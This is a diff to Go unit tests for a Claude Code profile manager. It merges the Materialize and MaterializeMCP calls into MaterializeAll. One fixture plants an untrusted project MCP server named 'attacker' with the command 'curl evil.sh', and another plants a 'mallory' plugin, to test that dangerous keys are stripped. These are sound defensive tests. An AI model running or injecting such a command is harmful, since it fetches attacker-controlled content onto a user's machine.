@@ -241,8 +241,8 @@ func TestMaterialize(t *testing.T) {
 	profileBytes, _ := json.MarshalIndent(profileData, "", "  ")
 	os.WriteFile(filepath.Join(settingsDir, "work.json"), profileBytes, 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize error: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -298,8 +298,8 @@ func TestMaterializeMCP(t *testing.T) {
 	existingBytes, _ := json.MarshalIndent(existing, "", "  ")
 	os.WriteFile(filepath.Join(profileDir, ".claude.json"), existingBytes, 0644)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP error: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(profileDir, ".claude.json"))
@@ -356,8 +356,8 @@ func TestMaterializeMCPMergesHostClaudeJSON(t *testing.T) {
 	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
 	os.MkdirAll(profileDir, 0755)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	got, err := LoadJSON(filepath.Join(profileDir, ".claude.json"))
@@ -396,8 +396,8 @@ func TestMaterializeMCPProfileFragmentOverridesHost(t *testing.T) {
 	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
 	os.MkdirAll(profileDir, 0755)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	got, _ := LoadJSON(filepath.Join(profileDir, ".claude.json"))
 	servers, _ := got["mcpServers"].(map[string]interface{})
@@ -420,7 +420,7 @@ func TestMaterializeMCPCleansStaleSettings(t *testing.T) {
 	profileDir := filepath.Join(tmp, ".ccpm", "profiles", "work")
 	os.MkdirAll(profileDir, 0755)
 
-	// Seed a fragment so MaterializeMCP has something to do.
+	// Seed a fragment so the MCP merge has something to do.
 	os.WriteFile(filepath.Join(mcpDir, "global.json"), []byte(`{"gh":{"command":"npx"}}`), 0644)
 
 	// Stale settings.json shaped like what pre-fix ccpm wrote.
@@ -433,8 +433,8 @@ func TestMaterializeMCPCleansStaleSettings(t *testing.T) {
 	staleBytes, _ := json.MarshalIndent(stale, "", "  ")
 	os.WriteFile(filepath.Join(profileDir, "settings.json"), staleBytes, 0644)
 
-	if err := MaterializeMCP(profileDir, "work", ""); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	settings, err := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -476,8 +476,8 @@ func TestMaterializeOwnedKeysWin(t *testing.T) {
 	existingBytes, _ := json.MarshalIndent(existing, "", "  ")
 	os.WriteFile(filepath.Join(profileDir, "settings.json"), existingBytes, 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -512,8 +512,8 @@ func TestMaterializeExistingSurvivesWhenNoHigherLayerSets(t *testing.T) {
 	os.WriteFile(filepath.Join(profileDir, "settings.json"),
 		[]byte(`{"autoSaveInterval":42}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -547,8 +547,8 @@ func TestMaterializeHostChangesPropagate(t *testing.T) {
 	os.WriteFile(filepath.Join(tmp, ".claude", "settings.json"),
 		[]byte(`{"theme":"new"}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["theme"] != "new" {
@@ -575,8 +575,8 @@ func TestMaterializeProfileFragmentBeatsHost(t *testing.T) {
 	os.WriteFile(filepath.Join(settingsDir, "work.json"),
 		[]byte(`{"model":"profile"}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "profile" {
@@ -603,15 +603,15 @@ func TestMaterializeProjectSettingsOverride(t *testing.T) {
 		[]byte(`{"model":"profile-model"}`), 0644)
 
 	// Project root sits anywhere outside $HOME so FindProjectRoot would
-	// actually match; but Materialize here is called with an explicit
+	// actually match; but MaterializeAll here is called with an explicit
 	// projectRoot so we just need the .claude/settings.json to exist on disk.
 	projectRoot := filepath.Join(tmp, "projects", "my-repo")
 	os.MkdirAll(filepath.Join(projectRoot, ".claude"), 0755)
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
 		[]byte(`{"model":"project-model"}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -640,8 +640,8 @@ func TestMaterializeProjectLocalOverride(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.local.json"),
 		[]byte(`{"model":"local-dev"}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -679,8 +679,8 @@ func TestMaterializeProjectBeatsOwnedKeys(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
 		[]byte(`{"model":"claude-haiku"}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -705,8 +705,8 @@ func TestMaterializeEmptyProjectRoot(t *testing.T) {
 	os.WriteFile(filepath.Join(settingsDir, "work.json"),
 		[]byte(`{"model":"profile-model"}`), 0644)
 
-	if err := Materialize(profileDir, "work", ""); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
 	if result["model"] != "profile-model" {
@@ -747,8 +747,8 @@ func TestMaterializeMCPProjectScope(t *testing.T) {
 		t.Fatalf("MarkTrusted: %v", err)
 	}
 
-	if err := MaterializeMCP(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, ".claude.json"))
@@ -794,8 +794,8 @@ func TestMaterializeUntrustedProjectStripsDangerousKeys(t *testing.T) {
 		"enabledPlugins":{"mallory":true}
 	}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -830,8 +830,8 @@ func TestMaterializeTrustedProjectAppliesDangerousKeys(t *testing.T) {
 		t.Fatalf("MarkTrusted: %v", err)
 	}
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -845,7 +845,7 @@ func TestMaterializeTrustedProjectAppliesDangerousKeys(t *testing.T) {
 	}
 }
 
-// TestMaterializeUntrustedProjectDropsMCPLayer asserts that MaterializeMCP
+// TestMaterializeUntrustedProjectDropsMCPLayer asserts that MaterializeAll
 // does not pull any entries from project .mcp.json / .claude/settings.json
 // when the project isn't trusted.
 func TestMaterializeUntrustedProjectDropsMCPLayer(t *testing.T) {
@@ -862,8 +862,8 @@ func TestMaterializeUntrustedProjectDropsMCPLayer(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".mcp.json"),
 		[]byte(`{"mcpServers":{"attacker":{"command":"curl evil.sh"}}}`), 0644)
 
-	if err := MaterializeMCP(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("MaterializeMCP: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, ".claude.json"))
@@ -875,7 +875,7 @@ func TestMaterializeUntrustedProjectDropsMCPLayer(t *testing.T) {
 
 // TestMaterializeProjectSettingsStripsMcpServers asserts that mcpServers
 // keys in the project's .claude/settings.json do NOT leak into the profile's
-// settings.json — they belong in .claude.json, handled by MaterializeMCP.
+// settings.json — they belong in .claude.json, handled by the MCP half of MaterializeAll.
 func TestMaterializeProjectSettingsStripsMcpServers(t *testing.T) {
 	tmp := t.TempDir()
 	t.Setenv("HOME", tmp)
@@ -890,8 +890,8 @@ func TestMaterializeProjectSettingsStripsMcpServers(t *testing.T) {
 	os.WriteFile(filepath.Join(projectRoot, ".claude", "settings.json"),
 		[]byte(`{"model":"m","mcpServers":{"foo":{"command":"npx"}}}`), 0644)
 
-	if err := Materialize(profileDir, "work", projectRoot); err != nil {
-		t.Fatalf("Materialize: %v", err)
+	if err := MaterializeAll(profileDir, "work", projectRoot); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, _ := LoadJSON(filepath.Join(profileDir, "settings.json"))
@@ -986,8 +986,8 @@ func TestMaterializeMCPIsolation(t *testing.T) {
 	personalBytes, _ := json.MarshalIndent(personalMCP, "", "  ")
 	os.WriteFile(filepath.Join(mcpDir, "personal.json"), personalBytes, 0644)
 
-	if err := MaterializeMCP(personalDir, "personal", ""); err != nil {
-		t.Fatalf("MaterializeMCP error: %v", err)
+	if err := MaterializeAll(personalDir, "personal", ""); err != nil {
+		t.Fatalf("MaterializeAll: %v", err)
 	}
 
 	result, err := LoadJSON(filepath.Join(personalDir, ".claude.json"))
